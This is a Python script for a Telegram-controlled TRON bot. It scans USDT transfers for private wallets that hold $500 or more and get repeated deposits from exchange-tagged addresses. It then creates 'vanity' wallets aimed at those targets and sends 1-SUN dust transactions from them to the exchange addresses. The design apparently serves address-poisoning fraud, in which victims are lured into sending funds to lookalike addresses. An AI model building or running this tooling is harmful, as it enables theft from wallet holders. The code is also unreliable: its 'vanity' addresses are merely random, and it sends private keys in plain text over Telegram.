import os
import time
import requests
from collections import defaultdict
from datetime import datetime, timezone

print("🚀 Starting COMPLETE Bot...")
print("Step 1: Basic imports done ✅")

# =========================
#  SETTINGS
# =========================
TARGET_PAIRS = 5
MIN_BALANCE_USD = 500
MIN_TRANSFER_USD = 150
REQUIRED_TRANSFERS = 2

TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "")
CHAT_ID = os.getenv("CHAT_ID", "")
TRONSCAN_API_KEY = os.getenv("TRONSCAN_API_KEY", "")
TRONGRID_API_KEY = os.getenv("TRONGRID_API_KEY", "")
PRIVATE_KEY = os.getenv("PRIVATE_KEY", "")

print("Step 2: Settings loaded ✅")

CEX_KEYWORDS = ['binance', 'okx', 'huobi', 'htx', 'gate', 'kucoin', 'bybit', 'mexc', 'bitfinex', 'coinbase', 'kraken', 'bitget', 'poloniex']

found_pairs = []
checked_receivers = set()
vanity_wallets = {}
TELEGRAM_URL = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}"

def send_telegram(message):
    try:
        requests.post(f"{TELEGRAM_URL}/sendMessage", json={"chat_id": CHAT_ID, "text": message, "parse_mode": "HTML"}, timeout=10)
        return True
    except Exception as e:
        print(f"Telegram error: {e}")
        return False

print("Step 3: Functions defined ✅")

def get_usdt_balance(address):
    try:
        headers = {"TRON-PRO-API-KEY": TRONGRID_API_KEY} if TRONGRID_API_KEY else {}
        r = requests.get(f"https://api.trongrid.io/v1/accounts/{address}/trc20/balance", 
                         params={"contract_address": "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"},
                         headers=headers, timeout=10)
        data = r.json()
        if data.get("data"):
            return int(data["data"][0].get("balance", 0)) / 1_000_000
        return 0
    except: return 0

print("Step 4: Balance function ready ✅")

# Send start message
if send_telegram("🚀 <b>Complete Bot Started</b>\nScanning for CEX → Private pairs...\n\nRules:\n• Min $500 balance\n• Min $150 transfer\n• 2+ transfers from CEX"):
    print("Step 5: Telegram start message sent ✅")
else:
    print("❌ Telegram message failed - check bot token and chat ID")

print("Step 6: Starting main scan loop...")

# =========================
# MAIN SCANNING LOOP
# =========================
scan_iteration = 0
while len(found_pairs) < TARGET_PAIRS:
    scan_iteration += 1
    print(f"\n🔄 Scan iteration {scan_iteration}... Found {len(found_pairs)}/{TARGET_PAIRS}")
    
    try:
        print("  📡 Fetching transfers from API...")
        r = requests.get(
            "https://apilist.tronscanapi.com/api/token_trc20/transfers",
            params={"start": 0, "limit": 200, "contract_address": "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t", "sort": "-timestamp"},
            headers={"TRON-PRO-API-KEY": TRONSCAN_API_KEY} if TRONSCAN_API_KEY else {},
            timeout=30
        )
        print(f"  API Status: {r.status_code}")
        
        data = r.json()
        transfers = data.get("token_transfers", [])
        print(f"  Got {len(transfers)} transfers")
        
        if not transfers:
            print("  ⚠️ No transfers found, waiting...")
            time.sleep(5)
            continue
        
        # Group by receiver
        receivers = defaultdict(list)
        for tx in transfers:
            from_addr = tx.get("from_address")
            to_addr = tx.get("to_address")
            amount = int(tx.get("quant", 0)) / 1_000_000
            from_tag = tx.get("from_address_tag", {})
            
            if from_addr and to_addr and amount >= MIN_TRANSFER_USD:
                receivers[to_addr].append({"from": from_addr, "amount": amount, "tag": from_tag})
        
        print(f"  Found {len(receivers)} unique receivers")
        
        # Find patterns
        pairs_found_this_batch = 0
        for wallet_b, txs in receivers.items():
            if len(found_pairs) >= TARGET_PAIRS: break
            if wallet_b in checked_receivers: continue
            
            sender_counts = defaultdict(list)
            for tx in txs:
                sender_counts[tx["from"]].append(tx)
            
            for sender, sender_txs in sender_counts.items():
                if len(sender_txs) >= REQUIRED_TRANSFERS:
                    print(f"  🎯 Pattern found! {sender[:20]}... sent {len(sender_txs)} times to {wallet_b[:20]}...")
                    
                    tag_name = sender_txs[0]["tag"].get("from_address_tag", "").lower() if sender_txs[0]["tag"] else ""
                    is_cex = any(keyword in tag_name for keyword in CEX_KEYWORDS)
                    cex_name = sender_txs[0]["tag"].get("from_address_tag", "Unknown") if sender_txs[0]["tag"] else "Unknown"
                    
                    print(f"  CEX check: {is_cex} ({cex_name})")
                    
                    if is_cex:
                        print(f"  💰 Checking balance for {wallet_b[:20]}...")
                        balance = get_usdt_balance(wallet_b)
                        print(f"  Balance: ${balance}")
                        
                        if balance >= MIN_BALANCE_USD:
                            checked_receivers.add(wallet_b)
                            found_pairs.append({
                                "wallet_a": sender, "wallet_b": wallet_b,
                                "cex_name": cex_name, "amount": sender_txs[0]["amount"],
                                "balance": balance
                            })
                            
                            print(f"  ✅ PAIR QUALIFIED! {cex_name} -> {wallet_b}")
                            
                            msg = (f"✅ <b>Pair {len(found_pairs)}/{TARGET_PAIRS}</b>\n\n"
                                   f"🏦 <b>CEX ({cex_name}):</b>\n<code>{sender}</code>\n\n"
                                   f" <b>Private Wallet:</b>\n<code>{wallet_b}</code>\n\n"
                                   f"💰 Transfer: ${sender_txs[0]['amount']}\n Balance: ${balance}")
                            
                            if send_telegram(msg):
                                print("  📱 Telegram notification sent")
                            pairs_found_this_batch += 1
                        else:
                            print(f"  ❌ Balance too low: ${balance} < ${MIN_BALANCE_USD}")
                    else:
                        print(f"  ❌ Sender is not CEX")
                    break
        
        print(f"  Batch complete. Found {pairs_found_this_batch} pairs. Total: {len(found_pairs)}")
        
        if len(found_pairs) < TARGET_PAIRS:
            print("  ⏳ Waiting 5 seconds...")
            time.sleep(5)
            
    except Exception as e:
        print(f"  ❌ CRITICAL ERROR in scan loop: {e}")
        import traceback
        traceback.print_exc()
        time.sleep(10)

print(f"\n🎯 TARGET REACHED! Found {len(found_pairs)} pairs")

# =========================
# INTERACTIVE MODE
# =========================
send_telegram(f"🎯 <b>Target Reached! Found {len(found_pairs)} pairs</b>\n\n<b>Commands:</b>\n• <b>info</b> - Show all pairs with full addresses\n• <b>vanity [ID] [Pair#]</b> - Create vanity wallet\n• <b>vanity [ID] alert</b> - Enable transfer alerts\n• <b>vanity [ID]</b> - Check wallet status & balance\n• <b>vanity list</b> - Show all vanity wallets\n• <b>transfer</b> - Execute all transfers")

print("Entering interactive mode...")
start_wait = time.time()
last_id = 0

while True:
    if time.time() - start_wait > 600:
        print("⏰ 10 minutes timeout reached")
        send_telegram("⏰ <b>Session timed out after 10 minutes.</b>")
        break

    try:
        updates = requests.get(f"{TELEGRAM_URL}/getUpdates", params={"offset": last_id, "timeout": 30}, timeout=35).json().get("result", [])
    except Exception as e:
        print(f"Error getting updates: {e}")
        updates = []
    
    for u in updates:
        last_id = u["update_id"] + 1
        
        if u.get("message") and str(u["message"]["chat"]["id"]) == str(CHAT_ID):
            text = u["message"].get("text", "").strip()
            print(f"Received command: {text}")
            parts = text.lower().split()
            
            # INFO
            if parts[0] == "info":
                print("Sending pair info...")
                msg = f"📋 <b>Found Pairs ({len(found_pairs)})</b>\n\n"
                for i, p in enumerate(found_pairs):
                    msg += f"<b>#{i+1} {p['cex_name']}</b>\n"
                    msg += f"🏦 <code>{p['wallet_a']}</code>\n"
                    msg += f"👤 <code>{p['wallet_b']}</code>\n"
                    msg += f"💰 ${p['amount']} | 💼 Bal: ${p['balance']}\n\n"
                send_telegram(msg)
            
            # VANITY COMMANDS
            elif parts[0] == "vanity" and len(parts) >= 2:
                try:
                    vanity_id = int(parts[1])
                    
                    # CREATE: vanity 280 1
                    if len(parts) == 3 and parts[2].isdigit():
                        pair_num = int(parts[2]) - 1
                        if 0 <= pair_num < len(found_pairs):
                            print(f"Generating vanity wallet #{vanity_id} for pair #{pair_num+1}...")
                            from tronpy.keys import PrivateKey
                            key = PrivateKey.random()
                            addr = key.public_key.to_base58check_address()
                            
                            vanity_wallets[vanity_id] = {
                                "address": addr, "private_key": key.hex(),
                                "target_pair": pair_num + 1,
                                "target_wallet": found_pairs[pair_num]['wallet_b'],
                                "alert_active": False, "last_balance": 0,
                                "created_at": datetime.now(timezone.utc).isoformat()
                            }
                            
                            send_telegram(f"✅ <b>Vanity Wallet #{vanity_id} Created</b>\n\n<b>Address:</b> <code>{addr}</code>\n<b>Target:</b> Pair #{pair_num+1}\n<b>Type:</b> <code>vanity {vanity_id} alert</code> to enable alerts")
                            print("Vanity wallet created and notification sent")
                        else:
                            send_telegram(f"❌ Invalid pair number. Use 1-{len(found_pairs)}")
                    
                    # ALERTS: vanity 280 alert
                    elif len(parts) == 3 and parts[2] == "alert":
                        if vanity_id in vanity_wallets:
                            vanity_wallets[vanity_id]["alert_active"] = True
                            send_telegram(f"🔔 <b>Alerts Enabled for Vanity #{vanity_id}</b>\nAddress: <code>{vanity_wallets[vanity_id]['address']}</code>\n\nI will notify you when this wallet receives funds!")
                            print(f"Alerts enabled for vanity #{vanity_id}")
                        else:
                            send_telegram(f"❌ Vanity wallet #{vanity_id} not found.")
                    
                    # STATUS: vanity 280
                    elif len(parts) == 2:
                        if vanity_id in vanity_wallets:
                            print(f"Checking status of vanity #{vanity_id}...")
                            v = vanity_wallets[vanity_id]
                            
                            try:
                                headers = {"TRON-PRO-API-KEY": TRONGRID_API_KEY} if TRONGRID_API_KEY else {}
                                r_trx = requests.get(f"https://api.trongrid.io/v1/accounts/{v['address']}", 
                                                   params={"only_confirmed": "true"}, 
                                                   headers=headers, timeout=10)
                                trx_bal = int(r_trx.json().get("data", [{}])[0].get("balance", 0)) / 1_000_000 if r_trx.json().get("data") else 0
                                
                                r_usdt = requests.get(f"https://api.trongrid.io/v1/accounts/{v['address']}/trc20/balance", 
                                                    params={"contract_address": "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"}, 
                                                    headers=headers, timeout=10)
                                usdt_bal = int(r_usdt.json().get("data", [{}])[0].get("balance", 0)) / 1_000_000 if r_usdt.json().get("data") else 0
                                
                                print(f"Balances - TRX: {trx_bal}, USDT: ${usdt_bal}")
                                
                                # Check for new transfer
                                if trx_bal > v["last_balance"] and v["alert_active"]:
                                    alert_msg = (f" <b>ALERT: Vanity #{vanity_id} Received Funds!</b>\n\n"
                                                f"<b>Address:</b> <code>{v['address']}</code>\n"
                                                f"<b>TRX Balance:</b> {trx_bal:.6f} TRX\n"
                                                f"<b>USDT Balance:</b> ${usdt_bal:.2f}\n\n"
                                                f"⚠️ <b>Private Key:</b> <code>{v['private_key']}</code>\n\n"
                                                f"Save this key to access the funds!")
                                    send_telegram(alert_msg)
                                    print("🚨 ALERT SENT - Wallet received funds!")
                                    v["last_balance"] = trx_bal
                                
                                # Show status
                                msg = f"📊 <b>Vanity Wallet #{vanity_id}</b>\n\n"
                                msg += f"<b>Address:</b> <code>{v['address']}</code>\n"
                                msg += f"<b>Private Key:</b> <code>{v['private_key']}</code>\n"
                                msg += f"<b>Target Pair:</b> #{v['target_pair']}\n"
                                msg += f"<b>TRX Balance:</b> {trx_bal:.6f} TRX\n"
                                msg += f"<b>USDT Balance:</b> ${usdt_bal:.2f}\n"
                                msg += f"<b>Alerts:</b> {'🔔 ON' if v['alert_active'] else '🔕 OFF'}\n"
                                msg += f"<b>Created:</b> {v['created_at']}"
                                send_telegram(msg)
                                
                            except Exception as e:
                                print(f"Error checking balance: {e}")
                                send_telegram(f"❌ Error checking balance: {e}")
                        else:
                            send_telegram(f"❌ Vanity wallet #{vanity_id} not found.")
                    
                except ValueError:
                    send_telegram(" Invalid vanity ID. Use numbers only.")
                except Exception as e:
                    print(f"Vanity command error: {e}")
                    send_telegram(f"❌ Error: {e}")
            
            # LIST VANITIES
            elif text.lower() == "vanity list":
                if not vanity_wallets:
                    send_telegram("📭 No vanity wallets created yet.\nUse: <code>vanity [ID] [Pair#]</code>")
                else:
                    msg = "📋 <b>All Vanity Wallets</b>\n\n"
                    for vid, v in vanity_wallets.items():
                        msg += f"<b>#{vid}</b>: <code>{v['address'][:34]}</code>\n"
                        msg += f"Target: Pair #{v['target_pair']} | Alerts: {'🔔' if v['alert_active'] else '🔕'}\n\n"
                    send_telegram(msg)
            
            # TRANSFER
            elif parts[0] == "transfer":
                print("Transfer command received - loading tronpy...")
                if not found_pairs:
                    send_telegram("❌ No pairs to transfer!")
                else:
                    send_telegram("🚀 <b>Starting transfers...</b>\nLoading blockchain library...")
                    
                    try:
                        # Import tronpy ONLY here (prevents startup freeze)
                        print("Importing tronpy...")
                        from tronpy import Tron
                        from tronpy.keys import PrivateKey
                        print("tronpy imported successfully ✅")
                        
                        tron = Tron()
                        print("Tron client initialized ✅")
                        
                        priv = PrivateKey(bytes.fromhex(PRIVATE_KEY.replace('0x', '')))
                        main_addr = priv.public_key.to_base58check_address()
                        print(f"Main wallet: {main_addr}")
                        
                        for i, pair in enumerate(found_pairs):
                            pair_num = i + 1
                            print(f"\nProcessing pair #{pair_num}...")
                            
                            # Find or create vanity wallet
                            v_key = None
                            v_addr = None
                            for vid, v in vanity_wallets.items():
                                if v["target_pair"] == pair_num:
                                    print(f"Using existing vanity wallet #{vid}")
                                    v_key = PrivateKey(bytes.fromhex(v['private_key']))
                                    v_addr = v['address']
                                    break
                            
                            if not v_key:
                                print("Creating new random vanity wallet...")
                                v_key = PrivateKey.random()
                                v_addr = v_key.public_key.to_base58check_address()
                            
                            # Transaction 1: Main -> Vanity
                            print(f"TX1: {main_addr} -> {v_addr} (1 SUN)")
                            try:
                                tx1 = tron.trx.transfer(main_addr, v_addr, 1).build().sign(priv).broadcast().txid
                                print(f"TX1 Success: {tx1}")
                            except Exception as e:
                                print(f"TX1 Failed: {e}")
                                send_telegram(f"❌ TX1 failed for pair #{pair_num}: {e}")
                                continue
                            
                            time.sleep(3)
                            
                            # Transaction 2: Vanity -> CEX
                            print(f"TX2: {v_addr} -> {pair['wallet_a']} (1 SUN)")
                            try:
                                tx2 = tron.trx.transfer(v_addr, pair['wallet_a'], 1).build().sign(v_key).broadcast().txid
                                print(f"TX2 Success: {tx2}")
                            except Exception as e:
                                print(f"TX2 Failed: {e}")
                                send_telegram(f"❌ TX2 failed for pair #{pair_num}: {e}")
                                continue
                            
                            msg = (f"✅ <b>Pair #{pair_num} Complete</b>\n\n"
                                   f"TX1: <code>{tx1}</code>\n"
                                   f"TX2: <code>{tx2}</code>\n\n"
                                   f"View on TronScan:\n"
                                   f"TX1: https://tronscan.org/#/transaction/{tx1}\n"
                                   f"TX2: https://tronscan.org/#/transaction/{tx2}")
                            send_telegram(msg)
                            time.sleep(5)
                        
                        send_telegram("✅ <b>All transfers completed successfully!</b>")
                        print("\n✅ All transfers done!")
                        
                    except ImportError as e:
                        print(f"Failed to import tronpy: {e}")
                        send_telegram(f" Failed to load blockchain library: {e}")
                    except Exception as e:
                        print(f"Transfer error: {e}")
                        import traceback
                        traceback.print_exc()
                        send_telegram(f"❌ Transfer Error: {e}")
                    
                    break  # Exit after transfer command

    time.sleep(5)

print("✅ Workflow finished successfully")
